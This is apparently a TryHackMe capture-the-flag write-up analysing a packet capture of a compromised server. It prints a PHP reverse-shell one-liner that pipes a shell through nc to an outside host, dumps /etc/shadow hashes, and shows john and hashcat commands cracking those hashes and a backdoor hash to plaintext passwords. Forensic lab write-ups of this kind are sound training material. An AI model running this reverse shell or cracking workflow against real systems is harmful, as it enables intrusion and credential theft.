# Overpass2 Hacked

### Analyze pcap using wireshark.
* Open in Wireshark
    * Found that they used /development as a page to uploado a reverse shell.
    * They used this PHP code to gain it.
    ```
    <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
    ```
    * Found a password in the pcap: whenevernoteartinstant. It's a password that has sudo access.
    * They used this backdoor to establish a persistent shell https://github.com/NinjaJc01/ssh-backdoor

    * ### Hacker got the contents of /etc/shadow.
    ``` 
    root:*:18295:0:99999:7:::
    daemon:*:18295:0:99999:7:::
    bin:*:18295:0:99999:7:::
    sys:*:18295:0:99999:7:::
    sync:*:18295:0:99999:7:::
    games:*:18295:0:99999:7:::
    man:*:18295:0:99999:7:::
    lp:*:18295:0:99999:7:::
    mail:*:18295:0:99999:7:::
    news:*:18295:0:99999:7:::
    uucp:*:18295:0:99999:7:::
    proxy:*:18295:0:99999:7:::
    www-data:*:18295:0:99999:7:::
    backup:*:18295:0:99999:7:::
    list:*:18295:0:99999:7:::
    irc:*:18295:0:99999:7:::
    gnats:*:18295:0:99999:7:::
    nobody:*:18295:0:99999:7:::
    systemd-network:*:18295:0:99999:7:::
    systemd-resolve:*:18295:0:99999:7:::
    syslog:*:18295:0:99999:7:::
    messagebus:*:18295:0:99999:7:::
    _apt:*:18295:0:99999:7:::
    lxd:*:18295:0:99999:7:::
    uuidd:*:18295:0:99999:7:::
    dnsmasq:*:18295:0:99999:7:::
    landscape:*:18295:0:99999:7:::
    pollinate:*:18295:0:99999:7:::
    sshd:*:18464:0:99999:7:::
    james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
    paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
    szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
    bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
    muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
    ```
# John was able to crack 4 passwords from the shadow file.
```
┌──(zeus-kali㉿kali-vm)-[~/ctf/tryhackme/overpass2hacked]
└─$ john shadowed --wordlist=/usr/share/wordlists/fasttrack.txt 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
4g 0:00:00:00 DONE (2021-08-21 18:02) 28.57g/s 1585p/s 7928c/s 7928C/s Spring2017..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### The backdoor the hacker used has a default hash
* bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
### The backdoor also has a hardcoded salt as 1c362db832f3f864c8c2fe05f2002a05

### Hacker ran this command, which looks like he provided a hash...
```
/backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

# We can use hashcat to crack the password.
### hashcat -m 1710 -a 0 -o cracked.txt hackerhash /usr/share/wordlists/rockyou.txt
#### hashcat gave us this

# We can actually use JOHN for this!!!
## john-the-ripper --format='dynamic=sha512($p.$s)' --wordlist=./rockyou.txt backdoor-hash
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```
